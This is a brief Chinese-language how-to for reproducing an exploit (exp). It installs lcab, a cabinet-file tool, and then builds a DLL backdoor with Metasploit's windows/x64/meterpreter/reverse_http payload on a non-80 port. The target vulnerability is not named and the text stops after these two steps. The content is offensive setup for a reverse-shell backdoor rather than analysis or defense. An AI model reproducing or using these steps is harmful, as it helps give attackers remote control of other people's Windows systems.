# 简单复现exp方法

**一、这个需要一个依赖lcab**

```

apt-get install lcab
```

**二、这个exp中是利用dll的，所以我们生成一个后门，这里用80以外的端口就行**

```


use payload/windows/x64/meterpreter/reverse_http
```
